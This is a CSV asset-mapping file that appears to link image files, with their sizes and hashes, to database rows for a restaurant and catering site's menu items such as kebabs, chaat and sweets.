444.jpg,notforgittrack/the-famous-halwai-images/images/444.jpg,11304,42028b96435b0d60b4f6bbca5b6ee0f63e78accf3aca7b3056c695eee0696e0d,e0b883f96baa066ad029a8fa25f454b8,DB Mapped (Verified),menu_item_tbl,444,Kalmi Vada,menu_img
445.jpg,notforgittrack/the-famous-halwai-images/images/445.jpg,14845,fb9a212d8dd5bb3d87a9ded514e0ce4e89003846e94c4c15eb7146ac01c457cc,c86fdc8a75bb71a8bfa3861fae2e8828,DB Mapped (Verified),menu_item_tbl,445,Tunday Kebab,menu_img
445.jpg,notforgittrack/the-famous-halwai-images/images/445.jpg,14845,fb9a212d8dd5bb3d87a9ded514e0ce4e89003846e94c4c15eb7146ac01c457cc,c86fdc8a75bb71a8bfa3861fae2e8828,DB Mapped (Verified),menu_item_tbl,445,Tunday Kebab,menu_small_img
446.jpeg,notforgittrack/the-famous-halwai-images/images/446.jpeg,10707,1c745d5e3cbe388385d0b629a64395035a96834af11d71d9546aae2061687335,8bf4f1fe1d4a0eea54300a52a54d7fa8,DB Mapped (Verified),menu_item_tbl,446,Galawati Kebab,menu_img
446.jpeg,notforgittrack/the-famous-halwai-images/images/446.jpeg,10707,1c745d5e3cbe388385d0b629a64395035a96834af11d71d9546aae2061687335,8bf4f1fe1d4a0eea54300a52a54d7fa8,DB Mapped (Verified),menu_item_tbl,446,Galawati Kebab,menu_small_img
447.jpg,notforgittrack/the-famous-halwai-images/images/447.jpg,16461,51c894908e779e3a6a1eabdb4af1ee4fa875909ef6269f0f4e062c97b57bf0de,3e8ac41a3ae2f0aa58aeb9913ad6a2fe,DB Mapped (Verified),menu_item_tbl,447,Lucknowi Biryani,menu_img
447.jpg,notforgittrack/the-famous-halwai-images/images/447.jpg,16461,51c894908e779e3a6a1eabdb4af1ee4fa875909ef6269f0f4e062c97b57bf0de,3e8ac41a3ae2f0aa58aeb9913ad6a2fe,DB Mapped (Verified),menu_item_tbl,447,Lucknowi Biryani,menu_small_img
448.jpg,notforgittrack/the-famous-halwai-images/images/448.jpg,12825,7fd9551dabce113c6ca4b0098b6de4115ffe729dfa5313a0aa541b2091cd1cd0,496019ec6cfa031f51cb68a808391394,DB Mapped (Verified),menu_item_tbl,448,Tehri - Rice,menu_img
449.jpg,notforgittrack/the-famous-halwai-images/images/449.jpg,14953,e2bd92f0474dba8b920d780d82bb696104fd322d6ed4d95c639ede427b72e0e0,2d97d180acd5b0fe939edc9905d00d17,DB Mapped (Verified),menu_item_tbl,449,Nargisi Kofta,menu_img
45.jpeg,notforgittrack/the-famous-halwai-images/images/45.jpeg,11396,ce0cfcfc7cd49ab9cd18c6eb4d624f40f3da62bc91a5fdf0dbce6af398bbd139,86c4de81fd36cb164cf23428f9bdc582,DB Mapped (Verified),menu_item_tbl,45,Manchow Soup,menu_img
45.jpeg,notforgittrack/the-famous-halwai-images/images/45.jpeg,11396,ce0cfcfc7cd49ab9cd18c6eb4d624f40f3da62bc91a5fdf0dbce6af398bbd139,86c4de81fd36cb164cf23428f9bdc582,DB Mapped (Verified),menu_item_tbl,45,Manchow Soup,menu_small_img
450.jpg,notforgittrack/the-famous-halwai-images/images/450.jpg,12992,d606a53564ca3ef50aa6691e8ac68d19ca4728d3bc38f97cc99d470437531a7f,94b802f40a6ca2fd0df0e8203ce9ff2a,DB Mapped (Verified),menu_item_tbl,450,Sheermal,menu_img
451.jpg,notforgittrack/the-famous-halwai-images/images/451.jpg,10811,f40104cf6937f4631e1609e8ae4bb08ef81877b6a23b5fd1f52ed0f802ddea19,99188f67deea68649fc110533234e773,DB Mapped (Verified),menu_item_tbl,451,Kulfi Falooda,menu_img
452.jpg,notforgittrack/the-famous-halwai-images/images/452.jpg,7221,8ff5887ea9596837849997722f36372432a0192648c46d948c403282cb5ffc8a,af7a23ab140eaf2b01edf786fb0a88bc,DB Mapped (Verified),menu_item_tbl,452,Makhan Malai,menu_img
453.jpg,notforgittrack/the-famous-halwai-images/images/453.jpg,9507,ece414e86d64eb87b977c2edc2f9218a38fa5e3aef5bf5e447e10cbea5ae33f4,8d5d51af315201771ca54565c88dcd89,DB Mapped (Verified),menu_item_tbl,453,Kakori Kebab,menu_img
454.jpg,notforgittrack/the-famous-halwai-images/images/454.jpg,17993,3442b40381a38d96c4d621feb7f653c26fe80e2c2d5ad3f53a5b59daef28a72b,b33dd36daaf6c19f2d3da21b87fe1f33,DB Mapped (Verified),menu_item_tbl,454,Boti Kebab,menu_img
454.jpg,notforgittrack/the-famous-halwai-images/images/454.jpg,17993,3442b40381a38d96c4d621feb7f653c26fe80e2c2d5ad3f53a5b59daef28a72b,b33dd36daaf6c19f2d3da21b87fe1f33,DB Mapped (Verified),menu_item_tbl,454,Boti Kebab,menu_small_img
455.jpeg,notforgittrack/the-famous-halwai-images/images/455.jpeg,14115,3597c993cc227bf646b3fdb78eb14456c7ca13e680579e9b0c03875a9c670416,0a3c66a54f6b4ccf71b181516f9f1ffa,DB Mapped (Verified),menu_item_tbl,455,Paneer Pasanda,menu_img
455.jpeg,notforgittrack/the-famous-halwai-images/images/455.jpeg,14115,3597c993cc227bf646b3fdb78eb14456c7ca13e680579e9b0c03875a9c670416,0a3c66a54f6b4ccf71b181516f9f1ffa,DB Mapped (Verified),menu_item_tbl,455,Paneer Pasanda,menu_small_img
456.jpg,notforgittrack/the-famous-halwai-images/images/456.jpg,12298,1eff6c6b16421d2725565f6ceaec481df05fd5d89e6849dafd766432f8cf4395,d6dfd56065268fcf17d586f96e7b37bb,DB Mapped (Verified),menu_item_tbl,456,Shabdeg,menu_img
456.jpg,notforgittrack/the-famous-halwai-images/images/456.jpg,12298,1eff6c6b16421d2725565f6ceaec481df05fd5d89e6849dafd766432f8cf4395,d6dfd56065268fcf17d586f96e7b37bb,DB Mapped (Verified),menu_item_tbl,456,Shabdeg,menu_small_img
457.jpeg,notforgittrack/the-famous-halwai-images/images/457.jpeg,10992,20f04a130c787558d99ade8038e195ec5f5c0c3008f7731c9cf804fa1f1417ba,b2f7c4a9dddb53aaf80c5416be2c91c8,DB Mapped (Verified),menu_item_tbl,457,Puri-Sabzi,menu_img
457.jpeg,notforgittrack/the-famous-halwai-images/images/457.jpeg,10992,20f04a130c787558d99ade8038e195ec5f5c0c3008f7731c9cf804fa1f1417ba,b2f7c4a9dddb53aaf80c5416be2c91c8,DB Mapped (Verified),menu_item_tbl,457,Puri-Sabzi,menu_small_img
458.jpg,notforgittrack/the-famous-halwai-images/images/458.jpg,11063,89b253c4feec3d6ecd1b1ecd2207c42ef837d2c8d2ba888e5e675dc07d4b4451,7d652a7d71a29d5cb52a5f604fae6121,DB Mapped (Verified),menu_item_tbl,458,Jalebi,menu_img
458.jpg,notforgittrack/the-famous-halwai-images/images/458.jpg,11063,89b253c4feec3d6ecd1b1ecd2207c42ef837d2c8d2ba888e5e675dc07d4b4451,7d652a7d71a29d5cb52a5f604fae6121,DB Mapped (Verified),menu_item_tbl,458,Jalebi,menu_small_img
459.jpg,notforgittrack/the-famous-halwai-images/images/459.jpg,52558,c8859d582164b0d0e44240d36188f8cff87d7c0bca33eca4955fb82fc988e44e,70378f43d3d226b52a6856bfba759632,DB Mapped (Verified),menu_item_tbl,459,Banarasi Paan,menu_img
459.jpg,notforgittrack/the-famous-halwai-images/images/459.jpg,52558,c8859d582164b0d0e44240d36188f8cff87d7c0bca33eca4955fb82fc988e44e,70378f43d3d226b52a6856bfba759632,DB Mapped (Verified),menu_item_tbl,459,Banarasi Paan,menu_small_img
46.jpg,notforgittrack/the-famous-halwai-images/images/46.jpg,64253,0d0a7a1f7f10774b4dfbe74fad2cc79f51d77d8be39977a0a33300b934f275bb,3a2a2ce4f9c53aef407a30aee7da1928,DB Mapped (Verified),menu_item_tbl,46,Mexican Chilli,menu_img
46.jpg,notforgittrack/the-famous-halwai-images/images/46.jpg,64253,0d0a7a1f7f10774b4dfbe74fad2cc79f51d77d8be39977a0a33300b934f275bb,3a2a2ce4f9c53aef407a30aee7da1928,DB Mapped (Verified),menu_item_tbl,46,Mexican Chilli,menu_small_img
460.jpg,notforgittrack/the-famous-halwai-images/images/460.jpg,11330,afab584ffa39dd605cd769fb0fb5a9eab2054e4600c452941df7031c0dc9151f,5ef28fe2f2b1c75260fa34d13d60c69b,DB Mapped (Verified),menu_item_tbl,460,Bati Chokha,menu_img
460.jpg,notforgittrack/the-famous-halwai-images/images/460.jpg,11330,afab584ffa39dd605cd769fb0fb5a9eab2054e4600c452941df7031c0dc9151f,5ef28fe2f2b1c75260fa34d13d60c69b,DB Mapped (Verified),menu_item_tbl,460,Bati Chokha,menu_small_img
461.jpg,notforgittrack/the-famous-halwai-images/images/461.jpg,10372,1bb4acf05482e150e9c1922e19d7f2e350b55910d8ae4535bb9eb6b58c78ac8b,1f9b2aca3d407d5a135fac24689c81dc,DB Mapped (Verified),menu_item_tbl,461,Petha,menu_img
461.jpg,notforgittrack/the-famous-halwai-images/images/461.jpg,10372,1bb4acf05482e150e9c1922e19d7f2e350b55910d8ae4535bb9eb6b58c78ac8b,1f9b2aca3d407d5a135fac24689c81dc,DB Mapped (Verified),menu_item_tbl,461,Petha,menu_small_img
462.jpg,notforgittrack/the-famous-halwai-images/images/462.jpg,15558,3ed5d89e8da2c33fae3d1622aa4a141e072c5833a5463c816032c7f2fd9ba749,9b7cd434c2f787c0dace82d706229447,DB Mapped (Verified),menu_item_tbl,462,Rasmalai,menu_img
462.jpg,notforgittrack/the-famous-halwai-images/images/462.jpg,15558,3ed5d89e8da2c33fae3d1622aa4a141e072c5833a5463c816032c7f2fd9ba749,9b7cd434c2f787c0dace82d706229447,DB Mapped (Verified),menu_item_tbl,462,Rasmalai,menu_small_img
463.jpg,notforgittrack/the-famous-halwai-images/images/463.jpg,8752,f38a6a06105ab492c5700806977bf022897e31996ca17fcab36584c461063cbd,a12a29739d2662c201a725000f073b84,DB Mapped (Verified),menu_item_tbl,463,Khurchan,menu_img
463.jpg,notforgittrack/the-famous-halwai-images/images/463.jpg,8752,f38a6a06105ab492c5700806977bf022897e31996ca17fcab36584c461063cbd,a12a29739d2662c201a725000f073b84,DB Mapped (Verified),menu_item_tbl,463,Khurchan,menu_small_img
464.jpg,notforgittrack/the-famous-halwai-images/images/464.jpg,14423,7e95abb0bf12aeca01c75c510f81d1db2d1ab2f30100fd6c76aaca6aeaf082dc,89bb541f7f8fa4c18568a4e84349244c,DB Mapped (Verified),menu_item_tbl,464,Shahi Tukda,menu_img
464.jpg,notforgittrack/the-famous-halwai-images/images/464.jpg,14423,7e95abb0bf12aeca01c75c510f81d1db2d1ab2f30100fd6c76aaca6aeaf082dc,89bb541f7f8fa4c18568a4e84349244c,DB Mapped (Verified),menu_item_tbl,464,Shahi Tukda,menu_small_img
465.jpg,notforgittrack/the-famous-halwai-images/images/465.jpg,33792,c045b6e664a53b8d49676c30247bfa1cd2e95b12e9bd2260d40be799a8621969,f34525147c9548cd28d0bdc416d927e6,Static / Orphaned Disk Asset,,,,
47.jpeg,notforgittrack/the-famous-halwai-images/images/47.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,47,Chilli Paneer,menu_img
47.jpeg,notforgittrack/the-famous-halwai-images/images/47.jpeg,9742,259f750ca12725818f118beb214fb17a21abddf7f5e42e3951c2a69f0c57d1a5,9b35cd71ac9e3be8966379f95b52a68b,DB Mapped (Verified),menu_item_tbl,47,Chilli Paneer,menu_small_img
48.jpeg,notforgittrack/the-famous-halwai-images/images/48.jpeg,8647,e6eea7ed0534012c35c9c96378c33d2821879075b573e8f0bdcfabe6440f0921,2de01fa1ae21ff0682d2fddcece65c30,DB Mapped (Verified),menu_item_tbl,48,Spring Roll,menu_img
48.jpeg,notforgittrack/the-famous-halwai-images/images/48.jpeg,8647,e6eea7ed0534012c35c9c96378c33d2821879075b573e8f0bdcfabe6440f0921,2de01fa1ae21ff0682d2fddcece65c30,DB Mapped (Verified),menu_item_tbl,48,Spring Roll,menu_small_img
49.jpg,notforgittrack/the-famous-halwai-images/images/49.jpg,10123,0f4224ea25d07374e1dffa0288988f559f608d5291f07ec5ac289a43e38965a8,4b996c1bfb5f1c874c86f5623e130902,DB Mapped (Verified),menu_item_tbl,49,Hariyala Kabab,menu_img
49.jpg,notforgittrack/the-famous-halwai-images/images/49.jpg,10123,0f4224ea25d07374e1dffa0288988f559f608d5291f07ec5ac289a43e38965a8,4b996c1bfb5f1c874c86f5623e130902,DB Mapped (Verified),menu_item_tbl,49,Hariyala Kabab,menu_small_img
5.jpeg,notforgittrack/the-famous-halwai-images/images/5.jpeg,8829,f04ff04981aa0142cbdad1fa6db00be75025ac51e8eba400cad70695f03d3355,c44c034c263759a32932d490cf1e531c,DB Mapped (Verified),menu_item_tbl,5,Rasam,menu_img
50.jpeg,notforgittrack/the-famous-halwai-images/images/50.jpeg,12231,5fe96b867d730062bd2f568534dea35ed17b9e78f513a9ce3a98259ca867834d,3fd3439c83ac0ab1d0b3e5cade7a8407,DB Mapped (Verified),menu_item_tbl,50,Dry Manchurian,menu_img
50.jpeg,notforgittrack/the-famous-halwai-images/images/50.jpeg,12231,5fe96b867d730062bd2f568534dea35ed17b9e78f513a9ce3a98259ca867834d,3fd3439c83ac0ab1d0b3e5cade7a8407,DB Mapped (Verified),menu_item_tbl,50,Dry Manchurian,menu_small_img
51.jpeg,notforgittrack/the-famous-halwai-images/images/51.jpeg,103548,7ae9832e7ba9c8c42a6e88e24767ccf6866627e19fbcb28f782c3b41fae4521a,14649c870ad339873642567caf699e50,DB Mapped (Verified),menu_item_tbl,51,Wontons (Vegetable/Cheese Paneer /Corn),menu_img
51.jpeg,notforgittrack/the-famous-halwai-images/images/51.jpeg,103548,7ae9832e7ba9c8c42a6e88e24767ccf6866627e19fbcb28f782c3b41fae4521a,14649c870ad339873642567caf699e50,DB Mapped (Verified),menu_item_tbl,51,Wontons (Vegetable/Cheese Paneer /Corn),menu_small_img
52.jpg,notforgittrack/the-famous-halwai-images/images/52.jpg,122380,056502027e0bbdb0aa627b36767cbaabc73348f53559187172cce212c21f1b9a,f7cd7deb5999213ef97e39edf2ac07a2,DB Mapped (Verified),menu_item_tbl,52,Dal Ki Pakori,menu_img
52.jpg,notforgittrack/the-famous-halwai-images/images/52.jpg,122380,056502027e0bbdb0aa627b36767cbaabc73348f53559187172cce212c21f1b9a,f7cd7deb5999213ef97e39edf2ac07a2,DB Mapped (Verified),menu_item_tbl,52,Dal Ki Pakori,menu_small_img
53.jpg,notforgittrack/the-famous-halwai-images/images/53.jpg,66200,ac86211cc164f49c6a22a91b6c44dd477887995d22bd44d992d5cb91c7e7e561,876d28c234d2de3b1f78c73bd07c176a,DB Mapped (Verified),menu_item_tbl,53,Tanatan Kofta,menu_img
53.jpg,notforgittrack/the-famous-halwai-images/images/53.jpg,66200,ac86211cc164f49c6a22a91b6c44dd477887995d22bd44d992d5cb91c7e7e561,876d28c234d2de3b1f78c73bd07c176a,DB Mapped (Verified),menu_item_tbl,53,Tanatan Kofta,menu_small_img
54.jpg,notforgittrack/the-famous-halwai-images/images/54.jpg,16438,7410f7bba5dce36bf51ed86340bf0dc65a56e72cb72551fdc4015df265976e11,8b77527c6bea67e10928bee463030263,DB Mapped (Verified),menu_item_tbl,54,Paneer Pakora,menu_img
54.jpg,notforgittrack/the-famous-halwai-images/images/54.jpg,16438,7410f7bba5dce36bf51ed86340bf0dc65a56e72cb72551fdc4015df265976e11,8b77527c6bea67e10928bee463030263,DB Mapped (Verified),menu_item_tbl,54,Paneer Pakora,menu_small_img
55.jpg,notforgittrack/the-famous-halwai-images/images/55.jpg,20975,067ef257f594e1627c08ce60b6fd5a750a4047394d266722315069235b8fc9ca,fc787928aa74b0de223412c3cbae2108,DB Mapped (Verified),menu_item_tbl,55,Samosa(Matar/Allo),menu_img
55.jpg,notforgittrack/the-famous-halwai-images/images/55.jpg,20975,067ef257f594e1627c08ce60b6fd5a750a4047394d266722315069235b8fc9ca,fc787928aa74b0de223412c3cbae2108,DB Mapped (Verified),menu_item_tbl,55,Samosa(Matar/Allo),menu_small_img
56.jpg,notforgittrack/the-famous-halwai-images/images/56.jpg,6555,0295b5d331cc2ee1a510684aac8c1ffddcf3bfc496176d8426e91eaa07837fb1,67e341a19d6a74db644f4e3240163886,DB Mapped (Verified),menu_item_tbl,56,French Fry,menu_img
56.jpg,notforgittrack/the-famous-halwai-images/images/56.jpg,6555,0295b5d331cc2ee1a510684aac8c1ffddcf3bfc496176d8426e91eaa07837fb1,67e341a19d6a74db644f4e3240163886,DB Mapped (Verified),menu_item_tbl,56,French Fry,menu_small_img
57.jpg,notforgittrack/the-famous-halwai-images/images/57.jpg,22373,31bfec092b1043a0227cadd527fcb27c72bc6786ef55aba3b3886dbe018d5b08,8140b9921c8b582edd6af136e569636e,DB Mapped (Verified),menu_item_tbl,57,Roasted Potato,menu_img
57.jpg,notforgittrack/the-famous-halwai-images/images/57.jpg,22373,31bfec092b1043a0227cadd527fcb27c72bc6786ef55aba3b3886dbe018d5b08,8140b9921c8b582edd6af136e569636e,DB Mapped (Verified),menu_item_tbl,57,Roasted Potato,menu_small_img
58.jpg,notforgittrack/the-famous-halwai-images/images/58.jpg,16182,f4d22d8a4870d8178c1fe88753e5e2b9fe712fa0165c9a68d61118eef63193bc,22cb3a444a28528c8b15e6c710baf7aa,DB Mapped (Verified),menu_item_tbl,58,Roasted Pineapple,menu_img
58.jpg,notforgittrack/the-famous-halwai-images/images/58.jpg,16182,f4d22d8a4870d8178c1fe88753e5e2b9fe712fa0165c9a68d61118eef63193bc,22cb3a444a28528c8b15e6c710baf7aa,DB Mapped (Verified),menu_item_tbl,58,Roasted Pineapple,menu_small_img
59.jpg,notforgittrack/the-famous-halwai-images/images/59.jpg,12019,a348a79acefe5e61289e2920b5e15f861a963417c3e8e30af75d9147caa77791,2d18f67f876e2da285962e43d7274ddf,DB Mapped (Verified),menu_item_tbl,59,Roasted Mushroom,menu_img
59.jpg,notforgittrack/the-famous-halwai-images/images/59.jpg,12019,a348a79acefe5e61289e2920b5e15f861a963417c3e8e30af75d9147caa77791,2d18f67f876e2da285962e43d7274ddf,DB Mapped (Verified),menu_item_tbl,59,Roasted Mushroom,menu_small_img
6.webp,notforgittrack/the-famous-halwai-images/images/6.webp,56850,b9872c83463af683fe8d833fd4c5edf7e29c84acca0b563afcf71139c7751adc,98ad7327cc7f280a534b6179ecc080e3,DB Mapped (Verified),menu_item_tbl,6,Lemon Rice,menu_img
6.webp,notforgittrack/the-famous-halwai-images/images/6.webp,56850,b9872c83463af683fe8d833fd4c5edf7e29c84acca0b563afcf71139c7751adc,98ad7327cc7f280a534b6179ecc080e3,DB Mapped (Verified),menu_item_tbl,6,Lemon Rice,menu_small_img
60.jpg,notforgittrack/the-famous-halwai-images/images/60.jpg,20790,87c26c44bf084c856bb7685b2e313771b8f696c7413aa882d76373e95e3d7c4a,909e058b74edb446c31fd91291219b21,DB Mapped (Verified),menu_item_tbl,60,Roasted Cauliflower,menu_img
60.jpg,notforgittrack/the-famous-halwai-images/images/60.jpg,20790,87c26c44bf084c856bb7685b2e313771b8f696c7413aa882d76373e95e3d7c4a,909e058b74edb446c31fd91291219b21,DB Mapped (Verified),menu_item_tbl,60,Roasted Cauliflower,menu_small_img
61.jpeg,notforgittrack/the-famous-halwai-images/images/61.jpeg,13818,5a0cae14485ae2bb650d00a197c106dda70eeda7baf3181d4c657c5503ad62b7,44f79ab7175d327d1fe76e90ce41f069,DB Mapped (Verified),menu_item_tbl,61,Roasted Apple,menu_img
61.jpeg,notforgittrack/the-famous-halwai-images/images/61.jpeg,13818,5a0cae14485ae2bb650d00a197c106dda70eeda7baf3181d4c657c5503ad62b7,44f79ab7175d327d1fe76e90ce41f069,DB Mapped (Verified),menu_item_tbl,61,Roasted Apple,menu_small_img
62.jpg,notforgittrack/the-famous-halwai-images/images/62.jpg,22877,e0562072e1be6f70fb6f637d24cc790a6b802fe3d5745ccd577c4a0b0f0f7bdd,d103e5522ed28bbfc89258f98c14eb80,DB Mapped (Verified),menu_item_tbl,62,Paneer Tikka,menu_img
62.jpg,notforgittrack/the-famous-halwai-images/images/62.jpg,22877,e0562072e1be6f70fb6f637d24cc790a6b802fe3d5745ccd577c4a0b0f0f7bdd,d103e5522ed28bbfc89258f98c14eb80,DB Mapped (Verified),menu_item_tbl,62,Paneer Tikka,menu_small_img
63.jpeg,notforgittrack/the-famous-halwai-images/images/63.jpeg,18215,8584b25caa3f231d001b168fbaed1975af79f21d3239b35737a581bb46b03be0,d76cbb3208da8bf9e4ce847da788e007,DB Mapped (Verified),menu_item_tbl,63,Veg Cutlet,menu_img
63.jpeg,notforgittrack/the-famous-halwai-images/images/63.jpeg,18215,8584b25caa3f231d001b168fbaed1975af79f21d3239b35737a581bb46b03be0,d76cbb3208da8bf9e4ce847da788e007,DB Mapped (Verified),menu_item_tbl,63,Veg Cutlet,menu_small_img
64.jpg,notforgittrack/the-famous-halwai-images/images/64.jpg,14317,c7eb78c49193928cf4bced22fbbc2a30f4451530968d9301347e311c658e069d,0f32383a06ce42c60156386e02b6779f,DB Mapped (Verified),menu_item_tbl,64,Alu Cutlet,menu_img
64.jpg,notforgittrack/the-famous-halwai-images/images/64.jpg,14317,c7eb78c49193928cf4bced22fbbc2a30f4451530968d9301347e311c658e069d,0f32383a06ce42c60156386e02b6779f,DB Mapped (Verified),menu_item_tbl,64,Alu Cutlet,menu_small_img
65.jpeg,notforgittrack/the-famous-halwai-images/images/65.jpeg,10160,cda8d7d839d88e396d8d0d1e014d549bfcca9a933c8c9562c814fa66aff8012b,4b04ce1e4ccf02a5664b6849d79d4644,DB Mapped (Verified),menu_item_tbl,65,Cheese Cutlet,menu_img
65.jpeg,notforgittrack/the-famous-halwai-images/images/65.jpeg,10160,cda8d7d839d88e396d8d0d1e014d549bfcca9a933c8c9562c814fa66aff8012b,4b04ce1e4ccf02a5664b6849d79d4644,DB Mapped (Verified),menu_item_tbl,65,Cheese Cutlet,menu_small_img
66.jpg,notforgittrack/the-famous-halwai-images/images/66.jpg,13125,6674905bef1a288b5b15c42cf9b59f424863750a326efe7977696ea01a14ad3b,a4476789a3d96fad16cd524af556a78a,DB Mapped (Verified),menu_item_tbl,66,Corn Cutlet,menu_img
66.jpg,notforgittrack/the-famous-halwai-images/images/66.jpg,13125,6674905bef1a288b5b15c42cf9b59f424863750a326efe7977696ea01a14ad3b,a4476789a3d96fad16cd524af556a78a,DB Mapped (Verified),menu_item_tbl,66,Corn Cutlet,menu_small_img
67.jpg,notforgittrack/the-famous-halwai-images/images/67.jpg,12419,407e6d308ba0d6f74460be8a8b0a6f3bd01d4c961cb9d1795c40d4bef758409e,7814a755f3f528effa886fbdd1c1ee93,DB Mapped (Verified),menu_item_tbl,67,Samosa,menu_img
67.jpg,notforgittrack/the-famous-halwai-images/images/67.jpg,12419,407e6d308ba0d6f74460be8a8b0a6f3bd01d4c961cb9d1795c40d4bef758409e,7814a755f3f528effa886fbdd1c1ee93,DB Mapped (Verified),menu_item_tbl,67,Samosa,menu_small_img
68.webp,notforgittrack/the-famous-halwai-images/images/68.webp,89588,bfc1beae7a7e5d84364930550c75b987ea1f642fccd262712e8d1e2c885f1691,dd1afbfa016891114bdf5f63c2e550ee,DB Mapped (Verified),menu_item_tbl,68,Golgappe/Puchke,menu_img
69.jpeg,notforgittrack/the-famous-halwai-images/images/69.jpeg,12967,407d08920abe4f7fb093147db215498b60db6e2e2b082d5e6539e6f93c54a488,f921acaf013f1e60ec4423de772340af,DB Mapped (Verified),menu_item_tbl,69,Raj Kachori,menu_img
7.jpg,notforgittrack/the-famous-halwai-images/images/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,notforgittrack/the-famous-halwai-images/images/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,notforgittrack/the-famous-halwai-images/images/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,notforgittrack/the-famous-halwai-images/images/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,notforgittrack/the-famous-halwai-images/images/7.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
70.jpg,notforgittrack/the-famous-halwai-images/images/70.jpg,286049,0365d997faff2c3ac61d1df778cf25580b49b07f574d901ce9b76dfa27033c47,5eaf1ba0886cded734fb81c4c3080d31,DB Mapped (Verified),menu_item_tbl,70,Laccha Tokri,menu_img
71.jpg,notforgittrack/the-famous-halwai-images/images/71.jpg,125015,8902a8a8543c861cead9ac16bce35376562eea39e3ed71d263687f196aeaa154,099e5c1edc0312c2972fae02f34624ce,DB Mapped (Verified),menu_item_tbl,71,Aloo Papri Chat,menu_img
72.jpeg,notforgittrack/the-famous-halwai-images/images/72.jpeg,10137,782c5357352b704732324e8dcb11ad2b4d329bf96c1fb04b26064ed2a9eb7aa0,1d3dbcaa82f67f7be08132cbcd5985cf,DB Mapped (Verified),menu_item_tbl,72,Dhai Bhalla,menu_img
73.jpg,notforgittrack/the-famous-halwai-images/images/73.jpg,98659,aefc6d69352b53eadd54e9ef1528846df563507a844d72705b3a605e57ce7258,881b6ae046924047e8b6243d1604bc2e,DB Mapped (Verified),menu_item_tbl,73,Haldvani Tikki Roll,menu_img
74.webp,notforgittrack/the-famous-halwai-images/images/74.webp,49550,55797591d421b239342f9010c94039e185511579cc74026a624f146071f49afe,67ed7f3d214d1f274e7295ca48840675,DB Mapped (Verified),menu_item_tbl,74,Dal Paneer Ki Tikia,menu_img
75.jpeg,notforgittrack/the-famous-halwai-images/images/75.jpeg,7137,8d0db56eb5138d9e9ca6bad1fd7af1c13917bf0fca5311749c899d1e47efa21e,3fcce59498414199b30aa73fa8170d3d,DB Mapped (Verified),menu_item_tbl,75,Paneer Corn Tikia,menu_img
76.jpg,notforgittrack/the-famous-halwai-images/images/76.jpg,65564,b41b6b3c9b4386a79d8cc2ff623cc4ca4c0a7c4308794b6c420e5fd7ea779e37,19bd8b42c25fd898627c0943876e5e4f,DB Mapped (Verified),menu_item_tbl,76,Aloo Matar Chat,menu_img
77.jpg,notforgittrack/the-famous-halwai-images/images/77.jpg,109078,76a5d44f97b7c10d731945b36eabea1cd40beb189b08f79d372c3660ebe25563,9ed974712bea20e1de5825890f428ddd,DB Mapped (Verified),menu_item_tbl,77,Shakargandhi Chat,menu_img
78.webp,notforgittrack/the-famous-halwai-images/images/78.webp,54882,2747dd7b5992d590313395bc77cf33b99e72e108cec2c880867675ea441e92ca,c1c5d16d2dafe9c32360e83574463cb7,DB Mapped (Verified),menu_item_tbl,78,American Corn (Live),menu_img
79.jpeg,notforgittrack/the-famous-halwai-images/images/79.jpeg,10832,e82653cd2f70a89dfc02fa0deb41028f217d6688a78c2990f445f5706b08ebdb,3ec873fc864e67ed8617c1e4c3ad91e1,DB Mapped (Verified),menu_item_tbl,79,Veg Spring Roll,menu_img
8.jpeg,notforgittrack/the-famous-halwai-images/images/8.jpeg,10115,8e34904ccc5637057c24d01e299a4030160d4f5c2d005e4c7d0cad1ce33c4826,d20d11d640e6e9325cde9996143e7236,DB Mapped (Verified),menu_item_tbl,8,Coconut Rice,menu_img
8.jpeg,notforgittrack/the-famous-halwai-images/images/8.jpeg,10115,8e34904ccc5637057c24d01e299a4030160d4f5c2d005e4c7d0cad1ce33c4826,d20d11d640e6e9325cde9996143e7236,DB Mapped (Verified),website_gallery,8,Images 8,gimage
80.jpg,notforgittrack/the-famous-halwai-images/images/80.jpg,116553,f68df1bd46cb27caefb2dee138c8ac7c09fb652f841cab9af92cb0882656a7a0,f2d7aff316d21c5baf3f93e94212756a,DB Mapped (Verified),menu_item_tbl,80,Veg Wonton,menu_img
81.jpeg,notforgittrack/the-famous-halwai-images/images/81.jpeg,75240,f05fe8ae2eb5faccfe23e9ddd7ff19786a42f4172ae98c5d3d1c4318475749c2,c9ae04c84081e5f093d10eb1ed2a2150,DB Mapped (Verified),menu_item_tbl,81,Veg Dimsum,menu_img
82.jpg,notforgittrack/the-famous-halwai-images/images/82.jpg,86362,24c350ac6ae2dab53464b57c44d316170e9d402620030eb5ce0215926e87ae10,157c298cfb3e6ae5ff8623d74afcad3c,DB Mapped (Verified),menu_item_tbl,82,Chili Gobhi,menu_img
83.jpg,notforgittrack/the-famous-halwai-images/images/83.jpg,68062,1f0c99cec9cc970597115db06eaa36b6314538668204e915abb4bebc39f329d4,098c39575ecd19390f7bc17e17f497af,DB Mapped (Verified),menu_item_tbl,83,Chinese Samosa,menu_img
84.jpg,notforgittrack/the-famous-halwai-images/images/84.jpg,331091,03f8490c01a47f4ab3648e4429ef493e0ae66645a63e0226043484d0ae2fc688,30d6cf1858487df31e959b09a9d31d98,DB Mapped (Verified),menu_item_tbl,84,Fried Rice/Ginger Fried Rice,menu_img
